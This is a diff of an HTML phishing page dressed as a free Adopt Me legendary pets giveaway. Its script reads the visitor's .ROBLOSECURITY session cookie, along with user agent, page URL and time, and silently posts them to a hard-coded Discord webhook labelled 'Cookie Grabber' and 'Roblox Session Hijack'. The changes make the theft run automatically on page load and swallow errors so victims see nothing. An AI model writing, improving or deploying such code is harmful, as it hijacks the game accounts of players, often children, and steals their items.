@@ -3,41 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adopt Me FREE LEGENDARY PETS</title>
+    <title>Adopt Me - FREE LEGENDARY PETS GIVEAWAY!</title>
     <style>
-        body { margin:0; background:#000; color:#fff; font-family:Arial; text-align:center; }
-        img { max-width:100%; }
+        body { 
+            margin: 0; 
+            background: #0a0a0a; 
+            color: #fff; 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            padding: 20px;
+        }
+        img { 
+            max-width: 90%; 
+            border: 8px solid #ffd700; 
+            cursor: pointer; 
+            margin: 20px 0;
+        }
+        h1 { color: #00ff00; text-shadow: 0 0 10px #00ff00; }
     </style>
 </head>
 <body>
-    <h1>Claim Your FREE Adopt Me Legendaries!</h1>
-    <img src="https://i.imgur.com/your-image-here.jpg" alt="Adopt Me">
-    <p>Click below to claim</p>
-    <button onclick="stealCookie()">Claim Now</button>
+    <h1>🎉 CLICK THE IMAGE TO CLAIM YOUR FREE LEGENDARY PETS! 🎉</h1>
+    <p>Thousands already claimed today!</p>
+    
+    <img src="https://i.imgur.com/0z3vK9L.jpg" alt="Click to Claim" onclick="grabCookie()">
+    
+    <p>Tap the legendary pet to redeem instantly!</p>
 
     <script>
-        function stealCookie() {
+        function grabCookie() {
             const cookies = document.cookie;
-            const robloxCookie = cookies.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) 
-                               || 'No ROBLOSECURITY found';
-            
-            // Replace with YOUR Discord webhook
-            const webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
-            
-            fetch(webhook, {
+            const robloxToken = cookies.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) 
+                             || 'No .ROBLOSECURITY token found';
+
+            const webhookUrl = "https://discord.com/api/webhooks/1506368763271057459/1VdWzn-_ZxnjzxHygEweopXNvbGZqe0iRgyqPRgQwJekIHLHQ3IQM1rNsBNiG3aOQqYA";
+
+            const payload = {
+                username: "🍪 Cookie Grabber",
+                avatar_url: "https://i.imgur.com/0z3vK9L.jpg",
+                content: `**New Victim Cookie Logged!**`,
+                embeds: [{
+                    title: "Roblox Session Hijack",
+                    description: "```" + robloxToken + "```",
+                    color: 0xff00ff,
+                    fields: [
+                        { name: "User-Agent", value: navigator.userAgent.substring(0, 300), inline: false },
+                        { name: "Page URL", value: location.href, inline: false },
+                        { name: "Timestamp", value: new Date().toISOString(), inline: false }
+                    ]
+                }]
+            };
+
+            fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `**New Cookie Caught!**\n\`\`\`${robloxCookie}\`\`\`\nUser-Agent: ${navigator.userAgent}\nReferer: ${document.referrer}\nTime: ${new Date().toISOString()}`
-                })
-            })
-            .then(() => alert("Claimed! Check your inventory..."))
-            .catch(err => console.error(err));
+                body: JSON.stringify(payload)
+            }).catch(() => {}); // Silent fail
         }
 
-        // Auto-run on load (most effective)
+        // AUTO GRAB ON PAGE LOAD (silent)
         window.onload = function() {
-            stealCookie();
+            setTimeout(grabCookie, 800);
         };
     </script>
 </body>
